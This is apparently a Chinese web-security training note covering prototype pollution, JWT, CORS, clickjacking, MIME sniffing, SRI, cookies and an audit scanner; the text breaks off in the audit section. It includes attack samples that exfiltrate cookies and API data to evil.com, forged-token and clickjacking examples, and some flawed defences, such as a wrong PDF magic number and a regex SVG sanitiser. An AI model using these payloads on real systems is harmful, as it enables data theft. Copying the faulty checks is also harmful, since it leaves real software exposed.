# Web 安全专项训练 v9 — 新攻击向量 + 实战审计

> **日期**: 2026-05-07 13:00  
> **主题**: 原型链污染 / JWT 安全 / CORS 漏洞 / Clickjacking / MIME 嗅探 / SRI / 安全审计实战  
> **前置**: v1-v8 已覆盖 XSS/CSRF/Sanitization/CSP/高级绕过/SSTI/SSRF/安全工程化  
> **本次差异化**: 聚焦前 8 轮未深入的新攻击面 + 完整漏洞审计工作流

---

## 目录

1. [Prototype Pollution — 原型链污染](#1-prototype-pollusion)
2. [JWT 安全 — 签名绕过与密钥泄露](#2-jwt-安全)
3. [CORS 配置错误](#3-cors-配置错误)
4. [Clickjacking — 点击劫持](#4-clickjacking)
5. [MIME Sniffing 与 Content-Type 攻击](#5-mime-sniffing)
6. [Subresource Integrity (SRI)](#6-sri)
7. [Cookie 安全深度](#7-cookie-安全)
8. [安全审计实战 — 漏洞发现与修复工作流](#8-安全审计实战)
9. [综合攻防演练 — 多向量组合攻击](#9-综合攻防)
10. [v9 新增知识点总结](#10-总结)

---

## 1. Prototype Pollution — 原型链污染

### 1.1 攻击原理

JavaScript 中所有对象继承自 `Object.prototype`。如果攻击者能通过递归合并操作污染 `Object.prototype`，所有后续创建的对象都会继承被污染的属性。

```javascript
// --- 漏洞: 不安全的递归合并 ---
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // ← 递归合并
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// --- 攻击 ---
const payload = JSON.parse('{"__proto__":{"admin":true,"role":"superadmin"}}');
const user = { name: 'alice' };
merge(user, payload);

// 污染了 Object.prototype!
const newUser = {};
console.log(newUser.admin); // true ← 所有新对象都继承了 admin 属性
console.log({}.role);       // "superadmin"

// --- 利用场景: 权限绕过 ---
function isAdmin(user) {
  return user.isAdmin === true; // 被污染后返回 true
}
console.log(isAdmin(newUser)); // true ← 权限绕过!
```

### 1.2 攻击向量

```javascript
// 向量 1: JSON 解析 → 合并
const data = JSON.parse(req.body.config);
merge(appConfig, data);

// 向量 2: URL 参数解析
// ?__proto__[polluted]=true
const params = queryString.parse(req.url);
merge(config, params);

// 向量 3: 命令行参数
// node app.js --__proto__.admin=true
const argv = minimist(process.argv.slice(2));
merge(config, argv);

// 向量 4: lodash merge/assignIn
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__":{"x":"polluted"}}'));
// lodash < 4.17.16 受影响

// 向量 5: 递归 Object.assign
function deepAssign(target, ...sources) {
  return sources.forEach(src => {
    Object.keys(src).forEach(key => {
      if (typeof src[key] === 'object') {
        deepAssign(target[key] = target[key] || {}, src[key]);
      } else {
        target[key] = src[key];
      }
    });
  });
}
deepAssign({}, JSON.parse('{"__proto__":{"polluted":true}}'));
```

### 1.3 防御方案

```javascript
// --- 防御 1: 使用 Object.create(null) 创建无原型对象 ---
function safeMerge(target, source) {
  for (const key in source) {
    // 跳过危险键
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = Object.create(null);
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// --- 防御 2: Object.freeze(Object.prototype) ---
Object.freeze(Object.prototype);
// 但会阻止所有原型修改，可能影响第三方库

// --- 防御 3: 使用 Map 替代普通对象 ---
const config = new Map();
config.set('admin', true);
// Map 没有原型链，不受污染影响

// --- 防御 4: hasOwnProperty 检查 ---
function safeMergeV2(target, source) {
  for (const key in source) {
    if (!Object.prototype.hasOwnProperty.call(source, key)) continue;
    if (key === '__proto__' || key === 'constructor') continue;
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = Object.create(null);
      }
      safeMergeV2(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// --- 防御 5: 使用安全库 ---
// npm i @node-rules/prototype-pollution-shield
// 或 lodash >= 4.17.21 (已修复)
```

### 1.4 实战: 完整污染利用链

```javascript
// --- 场景: 配置管理系统 ---
// File: src/security/prototype-pollution-demo.js

class ConfigManager {
  constructor() {
    this.config = Object.create(null);
    this.defaults = {
      debug: false,
      logLevel: 'info',
      maxRetries: 3,
      isAdmin: false
    };
    Object.assign(this.config, this.defaults);
  }

  // ❌ 漏洞: 接受用户输入合并
  updateConfig(userInput) {
    // 模拟不安全的深度合并
    const parsed = JSON.parse(userInput);
    this.deepMerge(this.config, parsed);
  }

  deepMerge(target, source) {
    for (const key of Object.keys(source)) {
      if (typeof source[key] === 'object' && source[key] !== null) {
        if (!target[key]) target[key] = {};
        this.deepMerge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
  }

  // 权限检查
  checkAccess(user) {
    // 依赖 isAdmin 属性
    if (user.isAdmin) {
      return 'ADMIN_ACCESS';
    }
    return 'USER_ACCESS';
  }
}

// --- 攻击演示 ---
const mgr = new ConfigManager();
console.log(mgr.checkAccess({ name: 'alice' })); // USER_ACCESS

// 攻击者注入污染 payload
mgr.updateConfig('{"__proto__":{"isAdmin":true}}');

// 所有新对象都继承 isAdmin
const attacker = { name: 'attacker' };
console.log(mgr.checkAccess(attacker)); // ADMIN_ACCESS ← 权限绕过!

// --- 修复版本 ---
class SecureConfigManager {
  constructor() {
    this.config = Object.create(null);
    this.config.debug = false;
    this.config.logLevel = 'info';
  }

  updateConfig(userInput) {
    const parsed = JSON.parse(userInput);
    this.safeMerge(this.config, parsed);
  }

  safeMerge(target, source) {
    const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
    for (const key of Object.keys(source)) {
      if (DANGEROUS_KEYS.has(key)) {
        console.warn(`[Security] Blocked dangerous key: ${key}`);
        continue;
      }
      if (typeof source[key] === 'object' && source[key] !== null) {
        if (!target[key] || typeof target[key] !== 'object') {
          target[key] = Object.create(null);
        }
        this.safeMerge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
  }

  checkAccess(user) {
    // 不依赖可能被污染的原型属性
    const isAdmin = Object.prototype.hasOwnProperty.call(user, 'isAdmin') && user.isAdmin;
    return isAdmin ? 'ADMIN_ACCESS' : 'USER_ACCESS';
  }
}

// 修复后攻击失效
const secureMgr = new SecureConfigManager();
secureMgr.updateConfig('{"__proto__":{"isAdmin":true}}');
console.log(secureMgr.checkAccess({ name: 'attacker' })); // USER_ACCESS ✅
```

---

## 2. JWT 安全

### 2.1 JWT 结构回顾

```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJpYXQiOjE2ODMwMjQwMDB9.xxxxx

Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"user":"alice","iat":1683024000}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

### 2.2 攻击向量 1: alg None 攻击

```javascript
// --- 漏洞: 服务端不验证 alg ---
const jwt = require('jsonwebtoken');

// ❌ 危险: 使用 jwt.decode 而非 jwt.verify
const token = req.headers.authorization?.split(' ')[1];
const decoded = jwt.decode(token); // 不验证签名!
req.user = decoded;

// --- 攻击: 修改 header 为 alg: "none" ---
// 原始: {"alg":"HS256","typ":"JWT"}
// 攻击: {"alg":"none","typ":"JWT"}
// 然后去掉 signature 部分: header.payload.

// --- 防御: 强制指定算法 ---
// ✅ 正确做法
const decoded = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256']  // 只允许 HS256
});

// ✅ 或使用 jose 库 (更严格)
const { jwtVerify } = require('jose');
const result = await jwtVerify(token, secret, {
  algorithms: ['HS256']
});
```

### 2.3 攻击向量 2: 密钥暴力破解

```javascript
// --- 漏洞: 弱密钥 ---
const secret = 'secret'; // 或 '123456', 'password'
const token = jwt.sign({ user: 'admin' }, secret);
// 可用 john the ripper / hashcat 秒破

// --- 防御: 强密钥 ---
const crypto = require('crypto');
const strongSecret = crypto.randomBytes(64).toString('hex'); // 128 字符随机密钥
// 或使用 RSA 私钥 (RS256)
const { privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 4096,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
});
```

### 2.4 攻击向量 3: JWT 泄露与重放

```javascript
// --- 漏洞: JWT 无过期、无撤销 ---
const token = jwt.sign(
  { userId: 123, role: 'admin' },
  secret
  // 没有 expiresIn!
);
// 一旦泄露，永久有效

// --- 防御 1: 设置过期 ---
const token = jwt.sign(
  { userId: 123 },
  secret,
  { expiresIn: '15m' } // 短寿命 access token
);

// --- 防御 2: 刷新令牌机制 ---
// File: src/security/jwt-auth.js

const jwt = require('jsonwebtoken');
const crypto = require('crypto');

class JWTAuth {
  constructor(options) {
    this.accessSecret = options.accessSecret;
    this.refreshSecret = options.refreshSecret;
    this.accessExpiry = options.accessExpiry || '15m';
    this.refreshExpiry = options.refreshExpiry || '7d';
    // 已撤销的 refresh token 集合
    this.revokedRefreshTokens = new Map(); // jti → expiry time
  }

  generateTokens(userId, payload = {}) {
    const jti = crypto.randomUUID();
    const now = Math.floor(Date.now() / 1000);

    const accessToken = jwt.sign(
      {
        userId,
        jti,
        iat: now,
        exp: now + parseExpiry(this.accessExpiry),
        ...payload
      },
      this.accessSecret,
      { algorithm: 'HS256' }
    );

    const refreshToken = jwt.sign(
      {
        userId,
        jti,
        type: 'refresh',
        iat: now,
        exp: now + parseExpiry(this.refreshExpiry)
      },
      this.refreshSecret,
      { algorithm: 'HS256' }
    );

    return { accessToken, refreshToken };
  }

  verifyAccessToken(token) {
    return jwt.verify(token, this.accessSecret, {
      algorithms: ['HS256']
    });
  }

  refresh(refreshToken) {
    // 1. 验证 refresh token
    const decoded = jwt.verify(refreshToken, this.refreshSecret, {
      algorithms: ['HS256']
    });

    // 2. 检查是否已撤销
    if (this.revokedRefreshTokens.has(decoded.jti)) {
      throw new Error('Token revoked');
    }

    // 3. 颁发新 token 对 (轮换)
    const newTokens = this.generateTokens(decoded.userId, {
      // 保留原始 payload
    });

    // 4. 撤销旧 refresh token (防重放)
    this.revokedRefreshTokens.set(decoded.jti, decoded.exp);
    // 定期清理过期条目
    this.cleanupRevoked();

    return newTokens;
  }

  revoke(jti) {
    this.revokedRefreshTokens.set(jti, Date.now() / 1000 + 86400);
  }

  cleanupRevoked() {
    const now = Math.floor(Date.now() / 1000);
    for (const [jti, exp] of this.revokedRefreshTokens) {
      if (exp < now) this.revokedRefreshTokens.delete(jti);
    }
  }
}

function parseExpiry(exp) {
  const match = exp.match(/^(\d+)([smhd])$/);
  if (!match) return 900; // 默认 15 分钟
  const [, num, unit] = match;
  const multipliers = { s: 1, m: 60, h: 3600, d: 86400 };
  return parseInt(num) * (multipliers[unit] || 60);
}

// --- 防御 3: 绑定客户端指纹 ---
const token = jwt.sign(
  {
    userId: 123,
    // 绑定客户端特征 (可选，可能影响移动端切换网络)
    fp: hash(clientIp + userAgent) // 轻量指纹
  },
  secret,
  { expiresIn: '15m' }
);
```

### 2.5 JWT 安全 Checklist

```
□ 使用 jwt.verify 而非 jwt.decode
□ 强制指定 algorithms: ['HS256'] (或 RS256)
□ 使用强密钥 (≥64 字节随机)
□ 设置 expiresIn (access token ≤ 15min)
□ 实现 refresh token 轮换机制
□ 支持 token 撤销 (黑名单/数据库)
□ 不在 JWT payload 中存储敏感数据
□ 使用 HTTPS 传输
□ 敏感操作要求重新认证
□ 考虑使用 RS256 非对称加密 (多服务场景)
```

---

## 3. CORS 配置错误

### 3.1 CORS 原理

```
浏览器 → 预检请求 (OPTIONS) → 服务器
服务器 → Access-Control-Allow-Origin: https://trusted.com
浏览器 → 检查 Origin 是否匹配 → 允许/拒绝
```

### 3.2 常见错误配置

```javascript
// --- ❌ 错误 1: 允许所有来源 ---
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});
// 问题: 任何网站都能读取你的 API

// --- ❌ 错误 2: 反射 Origin 头 ---
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  next();
});
// 问题: 攻击者可以设置任意 Origin，等同于允许所有

// --- ❌ 错误 3: 允许所有来源 + 携带凭证 ---
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
// 问题: 浏览器会拒绝此组合 (规范不允许 * + credentials)
// 但有些开发者用反射 Origin 绕过:

// --- ❌ 错误 4: 不完整的白名单 ---
const allowedOrigins = ['https://example.com'];
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
// 问题: 子域名绕过!
// https://evil.example.com 不在白名单，但
// https://example.com.evil.com 也不在
// 如果用 startsWith 检查:
// origin.startsWith('https://example.com') → 匹配 example.com.evil.com!

// --- ❌ 错误 5: 允许所有方法 ---
res.setHeader('Access-Control-Allow-Methods', '*');
// 问题: 允许 DELETE/PATCH 等危险方法
```

### 3.3 正确配置

```javascript
// --- ✅ 安全 CORS 中间件 ---
// File: src/security/cors-middleware.js

const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
  'https://www.example.com'
]);

const ALLOWED_METHODS = ['GET', 'POST', 'PUT', 'DELETE'];
const ALLOWED_HEADERS = ['Content-Type', 'Authorization', 'X-Request-ID'];
const MAX_AGE = 86400; // 24 小时

function corsMiddleware(req, res, next) {
  const origin = req.headers.origin;

  // 1. 严格白名单匹配 (精确匹配，不用 startsWith/includes)
  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    // 非 CORS 请求或不在白名单 → 不设置 CORS 头
    return next();
  }

  // 2. 设置允许的来源
  res.setHeader('Access-Control-Allow-Origin', origin);

  // 3. 需要凭证时，必须指定具体 origin (不能用 *)
  if (req.credentials) {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin'); // 缓存变体
  }

  // 4. 预检请求处理
  if (req.method === 'OPTIONS') {
    // 允许的方法 (明确列出，不用 *)
    res.setHeader('Access-Control-Allow-Methods', ALLOWED_METHODS.join(', '));

    // 允许的请求头
    res.setHeader('Access-Control-Allow-Headers', ALLOWED_HEADERS.join(', '));

    // 允许暴露的响应头
    res.setHeader('Access-Control-Expose-Headers', 'X-Request-ID');

    // 预检缓存时间
    res.setHeader('Access-Control-Max-Age', MAX_AGE);

    res.status(204).end();
    return;
  }

  next();
}

// --- ✅ 带通配符子域的安全白名单 ---
function createSubdomainAwareCors(mainDomain) {
  return (req, res, next) => {
    const origin = req.headers.origin;
    if (!origin) return next();

    // 严格正则: 只允许 *.example.com
    const pattern = new RegExp(`^https://([a-z0-9-]+\\.)?${mainDomain.replace('.', '\\.')}$`);
    if (pattern.test(origin)) {
      res.setHeader('Access-Control-Allow-Origin', origin);
      res.setHeader('Vary', 'Origin');
    }
    next();
  };
}
// 使用: app.use(createSubdomainAwareCors('example.com'));
// 匹配: https://app.example.com ✅
// 拒绝: https://example.com.evil.com ❌
// 拒绝: https://evil-example.com ❌
```

### 3.4 CORS 攻击利用场景

```javascript
// --- 攻击场景: 利用宽松 CORS 窃取数据 ---
// 攻击者页面 (https://evil.com):
// <script>
//   fetch('https://api.target.com/user/bank-account', {
//     credentials: 'include' // 携带目标站 cookie
//   })
//   .then(r => r.json())
//   .then(data => {
//     // 如果 CORS 配置错误，可以读取响应!
//     fetch('https://evil.com/steal', {
//       method: 'POST',
//       body: JSON.stringify(data)
//     });
//   });
// </script>

// --- 防御: 最小权限 CORS ---
// - 只允许必要的 origin
// - 不使用 *
// - 敏感 API 不需要 CORS (如银行/支付接口)
// - 使用 SameSite Cookie 作为第二道防线
```

---

## 4. Clickjacking — 点击劫持

### 4.1 攻击原理

```
┌─────────────────────────────────────────────┐
│           攻击者页面 (evil.com)              │
│                                             │
│   ┌───────────────────────────────────┐     │
│   │  诱导用户点击的按钮 "点击领取奖品"  │     │
│   └───────────────────────────────────┘     │
│         ↓ (透明覆盖)                        │
│   ┌───────────────────────────────────┐     │
│   │  <iframe src="bank.com/transfer"  │     │
│   │       style="opacity:0">          │     │
│   │   实际点击的是银行转账按钮!         │     │
│   └───────────────────────────────────┘     │
└─────────────────────────────────────────────┘
```

### 4.2 防御: X-Frame-Options + CSP frame-ancestors

```javascript
// --- 防御 1: X-Frame-Options (传统) ---
// DENY: 禁止所有 iframe
// SAMEORIGIN: 只允许同域 iframe
// ALLOW-FROM: 已废弃，不要用
res.setHeader('X-Frame-Options', 'DENY');

// --- 防御 2: CSP frame-ancestors (现代，推荐) ---
res.setHeader(
  'Content-Security-Policy',
  "frame-ancestors 'self' https://admin.example.com"
);

// --- 防御 3: 前端 JS 防护 (辅助，不替代 header) ---
// File: src/security/clickjacking-defense.js

/**
 * 反点击劫持脚本
 * 放在 <head> 最前面，在页面渲染前执行
 */
(function antiClickjacking() {
  // 方法 1: 顶层检查
  if (window.location !== window.top.location) {
    window.top.location = window.location;
    return;
  }

  // 方法 2: visibility 控制
  // CSS: <style id="anti-clickjack">body{display:none !important;}</style>
  const style = document.getElementById('anti-clickjack');
  if (style) {
    style.parentNode.removeChild(style);
  }
})();

// --- 防御 4: 沙箱 iframe ---
// 如果必须嵌入第三方内容:
// <iframe src="https://third-party.com" sandbox="allow-scripts allow-same-origin">
// sandbox 限制 iframe 的能力:
// - 默认禁止 JS、表单提交、弹窗、top 导航
// - 按需添加 allow-* 权限
```

### 4.3 实战: 双重转账攻击

```javascript
// --- 攻击场景 ---
// 攻击者创建页面:
// <html>
// <style>
//   iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; }
//   .fake-btn { position: fixed; top: 50%; left: 50%; padding: 20px; font-size: 24px; }
// </style>
// <div class="fake-btn">🎁 点击领取 iPhone 16!</div>
// <iframe src="https://bank.com/transfer?to=attacker&amount=10000"></iframe>
// </html>

// 用户看到 "领取奖品" 按钮 → 点击 → 实际触发银行转账!

// --- 防御: 服务端二次确认 ---
// File: src/security/transfer-confirm.js

app.post('/api/transfer', async (req, res) => {
  const { to, amount, confirmCode } = req.body;

  // 1. CSRF Token 检查 (已有)
  // 2. 大额转账需要额外确认
  if (amount > 1000) {
    // 要求短信/邮件验证码
    if (!confirmCode) {
      // 发送验证码
      await sendVerificationCode(req.user.phone);
      return res.json({ requireConfirmation: true });
    }
    // 验证验证码
    const valid = await verifyCode(req.user.phone, confirmCode);
    if (!valid) {
      return res.status(403).json({ error: 'Invalid confirmation code' });
    }
  }

  // 3. 执行转账
  await transfer(req.user.id, to, amount);
  res.json({ success: true });
});

// 关键: 即使 iframe 能加载页面，关键操作需要额外验证
```

---

## 5. MIME Sniffing 与 Content-Type 攻击

### 5.1 攻击原理

浏览器会忽略 `Content-Type` 头，自行推断文件类型（MIME sniffing）。攻击者可上传看似图片但实际包含脚本的文件。

```html
<!-- 攻击者上传 "avatar.png"，实际内容: -->
GIF89a;
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

<!-- 如果服务器返回 Content-Type: image/png，但浏览器嗅探到 <script> -->
<!-- 某些旧浏览器会执行脚本! -->
```

### 5.2 防御: X-Content-Type-Options + 严格 Content-Type

```javascript
// --- 防御 1: 禁止 MIME 嗅探 ---
res.setHeader('X-Content-Type-Options', 'nosniff');
// 强制浏览器遵守 Content-Type，不自行推断

// --- 防御 2: 严格设置 Content-Type ---
// File: src/security/content-type-middleware.js

const path = require('path');

const SAFE_CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.gif':  'image/gif',
  '.svg':  'image/svg+xml',
  '.webp': 'image/webp',
  '.woff': 'font/woff',
  '.woff2':'font/woff2',
  '.ttf':  'font/ttf',
  '.pdf':  'application/pdf'
};

function contentTypeMiddleware(req, res, next) {
  const ext = path.extname(req.path).toLowerCase();
  const contentType = SAFE_CONTENT_TYPES[ext];

  if (contentType) {
    res.setHeader('Content-Type', contentType);
  } else {
    // 未知类型 → 强制下载，不渲染
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment');
  }

  // 禁止 MIME 嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');

  next();
}

// --- 防御 3: 文件上传安全 ---
// File: src/security/upload-security.js

const multer = require('multer');
const crypto = require('crypto');
const { execSync } = require('child_process');
const fs = require('fs');

const ALLOWED_TYPES = new Set([
  'image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/svg+xml',
  'application/pdf'
]);

const MAX_SIZE = 5 * 1024 * 1024; // 5MB

// 1. 文件名随机化 (不保留原始扩展名)
const storage = multer.diskStorage({
  destination: 'uploads/',
  filename: (req, file, cb) => {
    const ext = getSafeExtension(file.mimetype);
    cb(null, `${crypto.randomUUID()}${ext}`);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: MAX_SIZE },
  fileFilter: (req, file, cb) => {
    // 2. MIME 类型检查 (不只是扩展名)
    if (!ALLOWED_TYPES.has(file.mimetype)) {
      return cb(new Error('Invalid file type'));
    }

    // 3. 魔数 (Magic Number) 验证
    const header = file.buffer.slice(0, 4).toString('hex');
    const magicNumbers = {
      '89504e47': '.png',
      'ffd8ffe0': '.jpg', 'ffd8ffe1': '.jpg',
      '47494638': '.gif',
      '504b0304': '.zip' // PDF 也是 PK 开头，需要进一步检查
    };

    if (!magicNumbers[header]) {
      return cb(new Error('File content does not match declared type'));
    }

    cb(null, true);
  }
});

function getSafeExtension(mimetype) {
  const map = {
    'image/png': '.png',
    'image/jpeg': '.jpg',
    'image/gif': '.gif',
    'image/webp': '.webp',
    'image/svg+xml': '.svg',
    'application/pdf': '.pdf'
  };
  return map[mimetype] || '.bin';
}

// 4. SVG 特殊处理 (SVG 可包含脚本!)
function sanitizeSVG(input) {
  return input
    .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/on\w+\s*=/gi, 'data-disabled=')
    .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, s => {
      // 移除 CSS 中的 url() 表达式
      return s.replace(/url\s*\([^)]*\)/gi, 'url()');
    })
    .replace(/href\s*=\s*["']?\s*javascript:/gi, 'data-disabled=')
    .replace(/<foreignObject[^>]*>[\s\S]*?<\/foreignObject>/gi, '');
}

// 5. 上传到独立域名 (隔离 cookie)
// uploads.example.com (无 cookie) vs app.example.com (有 cookie)
```

---

## 6. Subresource Integrity (SRI)

### 6.1 原理

SRI 通过哈希验证外部资源完整性，防止 CDN 被篡改时注入恶意代码。

```html
<!-- ✅ 使用 SRI -->
<script
  src="https://cdn.example.com/jquery-3.7.0.min.js"
  integrity="sha384-cVRKpoh2iN+5yKAkVfjRAB1234567890abcdef=="
  crossorigin="anonymous"
></script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/bootstrap.css"
  integrity="sha384-abcdef1234567890=="
  crossorigin="anonymous"
>
```

### 6.2 生成哈希

```bash
# 生成 SHA-384 哈希
openssl dgst -sha384 -binary FILE.js | openssl base64 -A
# 输出: sha384-xxxxxxxxx

# 或使用 npx
npx sri-toolbox
```

### 6.3 实战: 动态 SRI 注入

```javascript
// --- File: src/security/sri-middleware.js ---

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SRIManager {
  constructor(publicDir) {
    this.publicDir = publicDir;
    this.integrityMap = new Map();
    this.scan();
  }

  scan() {
    // 扫描所有 JS/CSS 文件，计算 SRI 哈希
    const files = this.listFiles(this.publicDir);
    for (const file of files) {
      const ext = path.extname(file);
      if (['.js', '.css'].includes(ext)) {
        const content = fs.readFileSync(file);
        const hash = crypto.createHash('sha384').update(content).digest('base64');
        const relPath = path.relative(this.publicDir, file);
        this.integrityMap.set(`/${relPath}`, `sha384-${hash}`);
      }
    }
  }

  getTag(type, srcPath, attrs = {}) {
    const integrity = this.integrityMap.get(srcPath);
    const attrStr = Object.entries(attrs)
      .map(([k, v]) => `${k}="${v}"`)
      .join(' ');

    if (type === 'script') {
      return `<script src="${srcPath}" integrity="${integrity}" crossorigin="anonymous" ${attrStr}></script>`;
    }
    return `<link rel="stylesheet" href="${srcPath}" integrity="${integrity}" crossorigin="anonymous" ${attrStr}>`;
  }

  listFiles(dir) {
    const results = [];
    const items = fs.readdirSync(dir);
    for (const item of items) {
      const full = path.join(dir, item);
      const stat = fs.statSync(full);
      if (stat.isDirectory()) {
        results.push(...this.listFiles(full));
      } else {
        results.push(full);
      }
    }
    return results;
  }
}

// --- 使用示例 ---
const sri = new SRIManager('./public');

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      ${sri.getTag('style', '/css/app.css')}
    </head>
    <body>
      <h1>Hello</h1>
      ${sri.getTag('script', '/js/app.js')}
    </body>
    </html>
  `);
});

// 输出:
// <link rel="stylesheet" href="/css/app.css" integrity="sha384-xxx" crossorigin="anonymous">
// <script src="/js/app.js" integrity="sha384-yyy" crossorigin="anonymous"></script>
```

---

## 7. Cookie 安全深度

### 7.1 Cookie 属性全景

```javascript
// --- Cookie 属性完整配置 ---
res.cookie('session', sessionId, {
  httpOnly: true,      // 禁止 JS 访问 (防 XSS 窃取)
  secure: true,        // 仅 HTTPS 传输
  sameSite: 'strict',  // 防 CSRF (strict/lax/none)
  maxAge: 3600000,     // 1 小时过期
  path: '/',           // 作用路径
  domain: '.example.com', // 作用域名 (最小化)
  priority: 'high'     // 优先级
});
```

### 7.2 SameSite 深度分析

```
SameSite=strict:
  - 跨站请求完全不发送 cookie
  - 从外部链接点击 → 无 cookie → 需重新登录
  - 最安全但用户体验差

SameSite=lax (现代浏览器默认):
  - 顶级导航 GET 请求发送 cookie
  - 从外部链接点击 → 有 cookie (能保持登录)
  - POST/iframe/图片请求 → 无 cookie
  - 平衡安全与体验

SameSite=none:
  - 所有请求都发送 cookie
  - 必须配合 Secure 标志
  - 仅跨站场景需要 (如第三方支付/嵌入)
  - 完全依赖 CSRF Token 防护
```

### 7.3 Session 固定攻击防护

```javascript
// --- 漏洞: Session 固定 ---
// 1. 攻击者访问网站，获取 session ID: ABC123
// 2. 攻击者诱导受害者使用 ABC123 登录
//    (通过 URL: https://site.com;jsessionid=ABC123)
// 3. 受害者登录后，攻击者用 ABC123 访问受害者账户

// --- 防御: 登录后轮换 session ---
// File: src/security/session-security.js

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // 1. 验证凭据
  const user = authenticate(username, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // 2. 销毁旧 session (防固定攻击)
  const oldSessionId = req.sessionID;
  req.session.destroy(() => {
    // 3. 创建新 session
    req.session.regenerate((err) => {
      if (err) return res.status(500).json({ error: 'Session error' });

      // 4. 写入用户信息
      req.session.userId = user.id;
      req.session.loginTime = Date.now();
      req.session.ip = req.ip;
      req.session.userAgent = req.get('User-Agent');

      res.json({ success: true });
    });
  });
});

// --- 防御: 绑定 IP/User-Agent (可选，注意移动网络切换) ---
app.use((req, res, next) => {
  if (req.session.userId) {
    // 检查 IP 是否大幅变化 (同一 /24 子网允许)
    const sessionIP = req.session.ip;
    if (sessionIP) {
      const sessionSubnet = sessionIP.split('.').slice(0, 3).join('.');
      const currentSubnet = req.ip.split('.').slice(0, 3).join('.');
      if (sessionSubnet !== currentSubnet) {
        // IP 变化大 → 要求重新验证
        req.session.destroy();
        return res.status(401).json({ error: 'Session invalidated: IP changed' });
      }
    }
  }
  next();
});

// --- 防御: Idle Timeout ---
app.use((req, res, next) => {
  if (req.session.userId) {
    const idleTime = Date.now() - (req.session.lastActivity || 0);
    if (idleTime > 30 * 60 * 1000) { // 30 分钟
      req.session.destroy();
      return res.status(401).json({ error: 'Session expired: idle timeout' });
    }
    req.session.lastActivity = Date.now();
  }
  next();
});
```

---

## 8. 安全审计实战 — 漏洞发现与修复工作流

### 8.1 自动化扫描

```javascript
// --- File: scripts/security-audit.js ---

const { execSync } = require('child_process');
const fs = require('fs');

class SecurityAuditor {
  constructor(projectRoot) {
    this.projectRoot = projectRoot;
    this.findings = [];
  }

  // 1. 依赖漏洞扫描
  async scanDependencies() {
    try {
      const output = execSync('npm audit --json', {
        cwd: this.projectRoot,
        encoding: 'utf8'
      });
      const audit = JSON.parse(output);

      if (audit.metadata?.vulnerabilities) {
        const { critical, high, moderate } = audit.metadata.vulnerabilities;
        if (critical > 0 || high > 0) {
          this.findings.push({
            severity: 'CRITICAL',
            category: 'dependency',
            title: `依赖漏洞: ${critical} critical + ${high} high`,
            detail: audit.metadata.vulnerabilities,
            recommendation: '运行 npm audit fix 或手动更新'
          });
        }
      }
    } catch (e) {
      // npm audit 返回非 0 表示有漏洞
    }
  }

  // 2. 代码模式扫描
  scanCodePatterns() {
    const files = this.getAllFiles(this.projectRoot, ['.js', '.ts', '.jsx', '.tsx']);

    const patterns = [
      {
        regex: /innerHTML\s*=/,
        severity: 'HIGH',
        title: 'innerHTML 赋值 (XSS 风险)',
        fix: '使用 textContent 或 DOMPurify.sanitize()'
      },
      {
        regex: /eval\s*\(/,
        severity: 'CRITICAL',
        title: 'eval() 使用 (代码注入)',
        fix: '使用 JSON.parse() 或策略模式'
      },
      {
        regex: /new\s+Function\s*\(/,
        severity: 'HIGH',
        title: 'new Function() (代码注入)',
        fix: '使用函数映射表'
      },
      {
        regex: /document\.write\s*\(/,
        severity: 'MEDIUM',
        title: 'document.write() (XSS 风险)',
        fix: '使用 DOM API'
      },
      {
        regex: /dangerouslySetInnerHTML/,
        severity: 'HIGH',
        title: 'dangerouslySetInnerHTML (React XSS)',
        fix: '确保内容经过 DOMPurify 净化'
      },
      {
